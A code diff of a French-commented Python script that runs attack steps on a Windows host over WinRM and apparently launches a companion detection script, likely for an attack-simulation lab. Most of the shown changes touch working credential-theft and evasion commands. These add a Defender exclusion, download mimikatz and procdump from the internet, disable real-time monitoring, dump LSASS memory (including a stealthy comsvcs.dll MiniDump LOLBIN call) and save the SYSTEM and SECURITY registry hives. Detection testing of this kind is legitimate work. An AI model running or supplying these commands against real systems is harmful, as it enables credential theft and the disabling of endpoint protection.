@@ -5,6 +5,8 @@
 import winrm
 import subprocess
 import base64
+import os
+import tempfile
 
 """
 - supprimer les fichiers / exécutables téléchargés / générés pour la prochaine exécution du script => permettra d'éviter les erreurs inutiles
@@ -30,6 +32,54 @@ response = session.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::U
 print("STDOUT:\n", response.std_out.decode('utf-8'))
 print("STDERR:\n", response.std_err.decode('utf-8'))
 """
+
+#============================
+# Lancement script détection:
+#============================
+"""
+print(
+    "***************************\n"
+    "Lancement script détection:\n"
+    "***************************\n"
+)
+# Récupère le chemin absolu du script actuel
+#script_dir = os.path.dirname(os.path.abspath(__file__))
+
+# Construit la commande à exécuter dans gnome-terminal
+#command_execution_detection_py = f'cd "{script_dir}" && sleep 2; python3 detection.py; exec bash'
+#lancement_script_detection = subprocess.run(['gnome-terminal', '--', 'bash', 'c' , command_execution_detection_py], shell=True, capture_output=True, text=True)
+lancement_script_detection = subprocess.run(['xfce4-terminal', '--hold', '--command', 'bash -c "python3 detection.py; exec bash"'], shell=True, capture_output=True, text=True)
+#lancement_script_detection = subprocess.run(['gnome-terminal', '--', 'echo "test"'], shell=True, capture_output=True, text=True)
+print(
+    "**************************\n"
+    "Résultat script détection:\n"
+    "**************************\n"
+    + lancement_script_detection.stdout
+)
+print(
+    "************************\n"
+    "Erreur script détection:\n"
+    "************************\n"
+    + lancement_script_detection.stderr
+)
+"""
+
+# Création du script temporaire
+with tempfile.NamedTemporaryFile(delete=False, suffix=".sh", mode='w') as script_file:
+    script_file.write(f"""#!/bin/bash
+cd "{os.getcwd()}"
+python3 detection.py
+exec bash
+""")
+    script_path = script_file.name
+
+# Rendre le script exécutable
+os.chmod(script_path, 0o755)
+
+# Lancer xfce4-terminal avec le script
+subprocess.Popen([
+    'xfce4-terminal', '--hold', '--command', script_path
+])
 
 #==========================
 # Tactique: Reconnaissance:
@@ -267,7 +317,7 @@ print(
     "Lancement ajout Exclusion Path Mimitakz:\n"
     "****************************************\n"
 )
-ajout_exclusion_path_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Add-MpPreference -ExclusionPath "C:\Users\Public\mimikatz" | Out-String')
+ajout_exclusion_path_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Add-MpPreference -ExclusionPath "C:\\Users\\Public\\mimikatz" | Out-String')
 print(
     "***************************************\n"
     "Résultat ajout Exclusion Path Mimitakz:\n"
@@ -311,7 +361,7 @@ print(
     "Lancement Download Mimikatz:\n"
     "****************************\n"
 )
-download_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "C:\Users\Public\mimikatz.zip" | Out-String')
+download_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "C:\\Users\\Public\\mimikatz.zip" | Out-String')
 print(
     "***************************\n"
     "Résultat Download Mimikatz:\n"
@@ -333,7 +383,7 @@ print(
     "Lancement Extract Mimikatz:\n"
     "***************************\n"
 )
-extract_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "C:\Users\Public\mimikatz.zip" -DestinationPath "C:\Users\Public\mimikatz" | Out-String')
+extract_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "C:\\Users\\Public\\mimikatz.zip" -DestinationPath "C:\\Users\\Public\\mimikatz" | Out-String')
 print(
     "**************************\n"
     "Résultat Extract Mimikatz:\n"
@@ -442,7 +492,7 @@ print(
     "Lancement vérification présence procdump.exe disque C:\n"
     "******************************************************\n"
 )
-veritification_presence_procdump_exe_disque_c = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-ChildItem -Path C:\ -Recurse -Filter procdump.exe -ErrorAction SilentlyContinue | Out-String')
+veritification_presence_procdump_exe_disque_c = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-ChildItem -Path C:\ -Recurse -Filter procdump.exe -ErrorAction SilentlyContinue | Out-String')
 print(
     "*****************************************************\n"
     "Résultat vérification présence procdump.exe disque C:\n"
@@ -464,7 +514,7 @@ print(
     "Lancement téléchargement procdump.zip:\n"
     "**************************************\n"
 )
-telechargement_procdump_zip = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:Temp\Procdump.zip" | Out-String')
+telechargement_procdump_zip = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:Temp\Procdump.zip" | Out-String')
 print(
     "*************************************\n"
     "Résultat téléchargement procdump.zip:\n"
@@ -486,7 +536,7 @@ print(
     "Lancement unzipping procdump.zip:\n"
     "*********************************\n"
 )
-unzipping_procdump_zip = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "$env:TEMP\Procdump.zip" -DestinationPath "$env:TEMP\Procdump" -Force | Out-String')
+unzipping_procdump_zip = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "$env:TEMP\Procdump.zip" -DestinationPath "$env:TEMP\Procdump" -Force | Out-String')
 print(
     "********************************\n"
     "Résultat unzipping procdump.zip:\n"
@@ -508,7 +558,7 @@ print(
     "Lancement désactivation du realtime monitoring:\n"
     "***********************************************\n"
 )
-disable_real_time_monitoring = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableRealtimeMonitoring $true | Out-String')
+disable_real_time_monitoring = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Set-MpPreference -DisableRealtimeMonitoring $true | Out-String')
 print(
     "**********************************************\n"
     "Résultat désactivation du realtime monitoring:\n"
@@ -530,7 +580,7 @@ print(
     "Lancement dump lsass:\n"
     "*********************\n"
 )
-dump_lsass = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; & "$env:TEMP\Procdump\procdump.exe" -accepteula -mm lsass.exe "$env:TEMP\lsass_dump.dmp" | Out-String')
+dump_lsass = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; & "$env:TEMP\Procdump\procdump.exe" -accepteula -mm lsass.exe "$env:TEMP\lsass_dump.dmp" | Out-String')
 print(
     "********************\n"
     "Résultat dump lsass:\n"
@@ -585,7 +635,7 @@ print(
     "Lancement exécution furtive via LOLBINs:\n"
     "****************************************\n"
 )
-execution_furtive_lolbins = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump  $(Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full | Out-String')
+execution_furtive_lolbins = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump  $(Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full | Out-String')
 print(
     "***************************************\n"
     "Résultat exécution furtive via LOLBINs:\n"
@@ -614,7 +664,7 @@ print(
     "Lancement backup ruche de registre HKLM\SYSTEM:\n"
     "***********************************************\n"
 )
-backup_ruche_registre_hklm_system = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SYSTEM C:\Temp\SYSTEM | Out-String')
+backup_ruche_registre_hklm_system = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SYSTEM C:\Temp\SYSTEM | Out-String')
 print(
     "**********************************************\n"
     "Résultat backup ruche de registre HKLM\SYSTEM:\n"
@@ -636,7 +686,7 @@ print(
     "Lancement backup ruche de registre HKLM\SECURITY:\n"
     "*************************************************\n"
 )
-backup_ruche_registre_hklm_security = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SECURITY C:\Temp\SECURITY | Out-String')
+backup_ruche_registre_hklm_security = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SECURITY C:\Temp\SECURITY | Out-String')
 print(
     "************************************************\n"
     "Résultat backup ruche de registre HKLM\SECURITY:\n"
@@ -669,13 +719,13 @@ print(
     "************************************************\n"
     "Résultat export ruche de registre HKLM\SECURITY:\n"
     "************************************************\n"
-    + export_ruche_registre_hklm_security.std_out.decode('utf-8')
+    + export_ruche_registre_hklm_security.std_out.decode('cp1252')
 )
 print(
     "**********************************************\n"
     "Erreur export ruche de registre HKLM\SECURITY:\n"
     "**********************************************\n"
-    + export_ruche_registre_hklm_security.std_err.decode('utf-8')
+    + export_ruche_registre_hklm_security.std_err.decode('cp1252')
 )
 
 
@@ -697,13 +747,13 @@ print(
     "**************************************************************\n"
     "Résultat export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
     "**************************************************************\n"
-    + export_ruche_registre_hkey_local_machine_security.std_out.decode('utf-8')
+    + export_ruche_registre_hkey_local_machine_security.std_out.decode('cp1252')
 )
 print(
     "************************************************************\n"
     "Erreur export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
     "************************************************************\n"
-    + export_ruche_registre_hkey_local_machine_security.std_err.decode('utf-8')
+    + export_ruche_registre_hkey_local_machine_security.std_err.decode('cp1252')
 )
 
 #======================================================================================================================#
